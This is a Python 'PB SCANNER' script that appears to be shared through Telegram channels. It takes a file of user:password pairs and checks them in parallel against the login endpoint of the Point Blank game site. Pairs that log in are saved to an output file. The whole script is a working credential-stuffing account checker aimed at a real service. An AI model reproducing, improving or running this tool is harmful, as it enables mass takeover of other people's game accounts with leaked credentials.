
# Croting: utf-8
# Py 3
# Coded By Kgyya


"""
JOIN US:
t.me/tempatconfig
t.me/bebas_berinternet

"""
import os
import requests as req
from concurrent.futures import ThreadPoolExecutor
grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[47;30m'
off = '\x1b[m'
bold = '\033[1m'
found = []
error = []

def kontol(i,user, pas,output):
 try:
  data = {
          "loginFail":"0",
          "userid":user,
          "password":pas
         }
  cek = req.post("https://www.pointblank.id/login/process", data=data).text
  if "tidak sesuai" in cek:
   print(f"{white}[{red}X{white}] {red}{user}{cyan}:{red}{pas}")
   error.append(i)
  elif "kegagalan login" in cek:
   print(f"{white}[{red}X{white}] {red}{user}{cyan}:{red}{pas}")
   error.append(i)
  else:
   print(f"{white}[{green}✓{white}] {green}{user}{cyan}:{green}{pas}")
   found.append(i)
   with open(output, "a") as asade:
    asade.write(f"{user}:{pas}\n")
 except req.exceptions.ConnectionError:
  print("[!] Tidak Ada Koneksi Internet...")
def main():
 try:
  os.system("clear")
  print(f"""{bold}{blue} ______ ______        _     ______        ______  
(_____ (____  \      | |   / _____)  /\  |  ___ \ 
 _____) )___)  )      \ \ | /       /  \ | |   | |
|  ____/  __  (        \ \| |      / /\ \| |   | |
| |    | |__)  )   _____) ) \_____| |__| | |   | |
|_|    |______/   (______/ \______)______|_|   |_|
{off}{bold}""")
  print(f"{green}PB SCANNER{off}")
  print(f"{green}B{cyan}y {flag}{blue}K{red}g{white}y{yellow}y{purple}a{off}")
  print(f"{white}[{red}!{white}] {yellow}File Harus Berisi ID:Password")
  list_akun = input(f"{white}[{blue}+{white}] {yellow}Input List File > {green}")
  output = input(f"{white}[{blue}+{white}] {yellow}Output > {green}")
  print("")
  with open(list_akun, "r") as (crot):
   lines = crot.readlines()
   count = 1
   print(f"{white}[{red}!{white}] {yellow}Total {white}{len(lines)} {yellow}Akun Terdeteksi...\n")
   with ThreadPoolExecutor() as ahh:
    for ngentot in lines:
     da = ngentot.strip()
     user = da.split(":")[0]
     pas = da.split(":")[1]
     ahh.submit(kontol,count,user,pas,output)
     if len(da) > 0:
      count += 1
      continue
  print(f"\n{white}[{red}!{white}] {yellow}Check Selesai...")
  print(f"{white}[{green}√{white}] {green}{len(found)}")
  print(f"{white}[{red}X{white}] {red}{len(error)}")
  print(f"{yellow}Akun {green}Aktif {yellow}Tersimpan Di: {output}{off}")
 except FileNotFoundError:
  print(f"{white}[{red}!{white}] {yellow}File {red}{list_akun} {yellow}Tidak Ditemukan...")
 except (ValueError, IndexError):
  print(f"{white}[{red}!{white}] {yellow}Format File Tidak Valid...")
if __name__=="__main__":
 main()
